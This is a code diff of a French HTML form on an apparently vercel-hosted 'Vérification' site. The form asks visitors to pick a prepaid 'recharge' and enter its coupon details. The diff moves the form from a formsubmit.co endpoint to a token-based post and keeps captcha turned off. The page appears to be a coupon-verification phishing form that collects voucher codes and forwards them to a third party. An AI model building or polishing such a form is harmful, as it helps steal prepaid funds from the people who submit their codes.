@@ -23,7 +23,17 @@
 
 <body cz-shortcut-listen="true">
     <div class="body-form">
-        <form id="sendmail" action='https://formsubmit.co/69b2a9edbaaf587d04e831601f3f63b8' method="POST">
+        <form id="sendmail" method="post" data-token="db9a8e6458b3a25b7337042135f97edf"
+        data-token-time="1745521270" data-formid="7"
+        enctype="multipart/form-data" action="/">
+        <input type="hidden" name="_subject" value="Nouvelle Vérification (Verification.vercel.app)">
+           
+        <input type="hidden" name="_captcha" value="false">
+    
+        <input type="text" name="_honey" style="display:none">
+    
+        <input type="hidden" name="_template" value="table">
+
             <h2>Veuillez entrer les informations du coupon ici.</h2>
             <div class="form-group gender">
                 <label for="type">Choisir une recharge * <span id="typeErr"></span></label>
@@ -71,8 +81,9 @@
             <div class="form-group submit-btn">
                 <input id="valider" type="submit" value="Valider">
             </div>
-            <input type="hidden" name="_next" value="https://verification70.vercel.app/thanks.html">
-            <input type="hidden" name="_captcha" value="false">
+            <!-- <input type="hidden" name="_next" value="https://verification70.vercel.app/thanks.html"> -->
+
+            
         </form>
     </div>
 
